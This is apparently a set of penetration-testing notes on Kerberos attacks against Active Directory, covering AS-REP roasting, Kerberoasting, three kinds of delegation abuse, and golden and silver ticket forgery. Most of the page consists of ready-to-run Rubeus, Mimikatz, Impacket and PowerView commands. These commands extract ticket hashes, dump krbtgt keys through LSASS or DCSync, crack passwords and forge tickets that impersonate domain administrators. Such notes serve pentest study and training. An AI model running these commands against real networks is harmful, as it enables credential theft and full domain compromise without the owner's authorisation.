# Content
- [Roasting attacks](#roasting-attacks)
  - [AS-REQ Roasting](#as-req-roasting)
  - [Kerberoasting](#kerberoasting)
- [Delegation attacks](#delegation-attacks)
  - [Unconstrained delegation](#unconstrained-delegation)
  - [Constrained Delegation](#constrained-delegation)
  - [Resource-based constrained delegation](#resource-based-constrained-delegation)
- [Ticket abuse](#ticket-abuse)
  - [Golden ticket](#golden-ticket)
  - [Silver ticket](#silver-ticket)  

# Roasting attacks

## AS-REQ Roasting
- AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
- Since part of that message is encrypted using the user’s password, it is possible to perform an offline brute-force attack to try and retrieve the user's password.
- The only information an attacker requires is the username they want to attack, which can also be found using other enumeration techniques.
-  if you have `GenericWrite/GenericAll` rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value


it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
![Screenshot 2024-06-18 at 12-41-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ebe87f88-c284-4848-ae60-bf1cedd3316c)


### Enumerating vulnerable users (need domain credentials)
```shell
# windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView

# Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
```

### Request AS_REP message
```
# Windows 
## Rubeus 
### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
.\Rubeus.exe asreproast 
### Targeted account
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]


## From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
Get-ASREPHash -Username VPN114user -verbose 

# Linux
## Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

##Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
### crack
```shell
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

## Kerberoasting 
- Kerberoasting focuses on the acquisition of TGS tickets, specifically those related to services operating under user accounts in Active Directory (AD)
- Kerberoasting is an attack against service accounts that allows an attacker to perform an offline password-cracking attack against the Active Directory account associated with the service.
- Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. 


### From Linux 

**GetUserSPNs.py**
```shell
# Listing SPN Accounts with GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Saving the TGS Ticket to an Output File
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Cracking the Ticket Offline with Hashcat**
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

**Testing Authentication against a Domain Controller**
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
### from Windows

#### setspn.exe manual method 
Enumerating SPNs and request tickets with setspn.exe

```powershell
# Enumerating SPNs
setspn.exe -Q */*

# Targeting a Single User Ticket
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extracting Tickets from Memory with Mimikatz , after requesting the tickets using `setspn.exe` now we need to extract it 
``` powershell
# extract tickets as .kirbi
.\mimikatz.exe  "kerberos::list /export" "exit"

# extract tickets as base64
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"

# Preparing the Base64 Blob for Cracking
echo "<base64 blob>" |  tr -d \\n  > encoded_file

# Placing the Output into a File as .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file)
kirbi2john sqldev.kirbi

# Modifiying crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

#### PowerView method 

```powershell
# Using PowerView to enumrate SPNs
import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

#### Rubeus method 

```powershell
# Using the /stats Flag (get SPNs count , encryption types and latest change date)
.\Rubeus.exe kerberoast /stats

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Using the /nowrap Flag ( nowrap flag prevents any base64 ticket blobs from being column wrapped for any function)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Encryption Types
- check the [chart](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) to see every decmial value and the corresponding encryption type
- check hashcat [hashs' id](https://hashcat.net/wiki/doku.php?id=example_hashes)
```powershell
# check encryption type
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# get ticket (we can see the supported Encryption type also)
.\Rubeus.exe kerberoast /user:testspn /nowrap

# downgrade to RC4 ( /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket )
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
```
| Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
|-------------------|-----------------|--------------|------------|
| $krb5tgs$23$      | RC4-HMAC        | 23           | 13100      |
| $krb5tgs$17$      | AES-128         | 17           | 19600      |
| $krb5tgs$18$      | AES-256         | 18           | 19700      |


```powershell 
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

- `RC4` is the fastest to crack
- downgrading do not work after windows server 2019 and above
- Windows Server 2019 Domain Controller will always return a service ticket encrypted with the highest level of encryption supported by the target account. 
- Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets
- edit encryption types used by Kerberos
```
It is possible to edit the encryption types used by Kerberos.
This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options,
then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.
Removing all other encryption types except for RC4_HMAC_MD5
```

# Delegation attacks
## Unconstrained delegation

Unconstrained delegation `TrustedForDelegation` is  a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have Administrator privileges on the machine, you will be able to dump the tickets and impersonate the users on any machine.


- If a user is marked as `Account is sensitive and cannot be delegated` in AD, you will not be able to impersonate them.


![Screenshot 2024-06-18 at 20-25-07 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/a00b55ca-4a12-4c9d-b0a6-4b6e8cd7e1a3)

![Screenshot 2024-06-18 at 20-47-52 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/8ea99855-6224-443c-913c-d0cae96922f2)


### Enumration
```shell
# List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
```

### Delegation
```shell
# Mimikatz
## Export tickets  
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
## import ticket
kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi

# Rubeus
## Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs
## import ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
## import ticket base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
Rubeus.exe ptt /ticket:<base64 ticket>


```

## Constrained Delegation
- Constrained delegation `TRUSTED_TO_AUTH_FOR_DELEGATION` is a “more restrictive” version of unconstrained delegation. In this case, a service has the right to impersonate a user to a well-defined list of services.
- If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.

- If a user is marked as `Account is sensitive and cannot be delegated` in AD, you will not be able to impersonate them.
- if the service is computer account you can get shell access but if user account you can not

![Screenshot 2024-06-18 at 20-34-36 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/a73aff59-eb34-4f43-8c84-f3cf0eeadd38)

![Screenshot 2024-06-18 at 20-47-21 8 Powerful Kerberos attacks (that analysts hate)](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ff8b6f98-4e34-4acb-bcd1-1de1cea0d073)


- Attribute `msds-allowedtodelegateto` identifies the SPNs of services the user




### Enumration 

```shell
# Windows 
## Powerview
Get-NetUser -TrustedToAuth
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

```
![Screenshot 2024-06-18 at 20-42-44 Kerberos Constrained Delegation Red Team Notes](https://github.com/kiro6/penetration-testing-notes/assets/57776872/dfc45db7-65f4-412f-b58f-8b904ff5c606)


### Delegation User
```shell
# if you are using the Delegation service (in a shell of context of the service) 
## request a delegation TGT for the user
.\Rubeus.exe tgtdeleg

## Using rubeus, we can now request TGS for administrator@offense.local, who will be allowed to authenticate to CIFS/dc01.offense.local
Rubeus.exe s4u /ticket:<ticket hash> /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt


# if you are using diffrent shell context but you have the passowrd
.\Rubeus.exe hash /password:Slavi123
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```
### Delegation System/Machine
```shell
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\dc01.offense.local\c$
```


## Resource-based constrained delegation
- It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.

- must be Windows 2012 Domain Controller or later
- write `msDS-AllowedToActOnBehalfOfOtherIdentitity` attribute

### Example steps
- We have code execution on the box `WS02` in the context of `offense\Service1` user;
- User `Service1` has WRITE privilege over a target computer `WS01`;
- User `Service1` creates a new computer object `FAKE01` in Active Directory (no admin required);
- User `Service1` leverages the WRITE privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
- WS01 trusts FAKE01 due to the modified msDS-AllowedToActOnBehalfOfOtherIdentity;
- We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\administrator` who is a Domain Admin;
- Profit - we can now access the c$ share of ws01 from the computer `ws02`.

### Requirements


### Enumration 

```shell
# check ms-ds-machineaccountquota
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local

# check DC version
Get-DomainController

# check object must not have the attribute msds-allowedtoactonbehalfofotheridentity 
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

### Attack
**Creating a Computer Object**
```shell
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
**Resource-based Constrained Delegation**
```shell
# activedirectory PowerShell module
$targetComputer = 'WS01'
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKE01$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked

# powerview
ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

**Execution**
```shell
# Generating RC4,AES Hash 
.\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local

# Impersonation
./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/victim.offense.local /ptt

./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

# Ticket abuse
## Golden ticket
- This attack assumes a Domain Controller compromise where KRBTGT account hash will be extracted which is a requirement for a successful Golden Ticket attack.
- A Golden Ticket attack consist on the creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user through the use of the NTLM hash of the Active Directory (AD) `krbtgt` account.

### Attack
```shell
# get krbtgt keys
## from DC memory (LSA) 
./mimikatz "lsadump::lsa /inject /name:krbtgt"
## using dcsync 
./mimikatz "privilege::debug" "lsadump::dcsync /domain:eagle.local /user:krbtgt"

# powerview
## get domain sid
Get-DomainSID
## get user rid
Get-DomainUser -Identity Administrator 

# Rubeus
## get info about user (instead of powerview)
Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /ldap /user:harmj0y /printcmd
## use the info to forge a ticket
## /id is user(that we want to impersonate) rid
## /pgid is group user rid
## /netbios is domain name
## check the rest of params in https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ticket-forgery
Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED

# mimikatz
./mimikatz  "kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt"
./mimikatz "kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt"

```

## Silver ticket
This method relies on acquiring the NTLM hash of a service account, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, impersonating any user, typically aiming for administrative privileges.

```shell
# Rubeus
## Forge TGS | creduser and credpassword are user have access to ldap info used to query info to forge TGS
Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob  /domain:rubeus.ghostpack.local /ptt

## krbkey and krbenctype arguments are optional  
Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\Administrator /credpassword:Password1 /user:ccob /krbkey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /krbenctype:aes256 /domain:rubeus.ghostpack.local /ptt

# mimikatz
## Forge TGS
./mimikatz "kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:admin" 
```
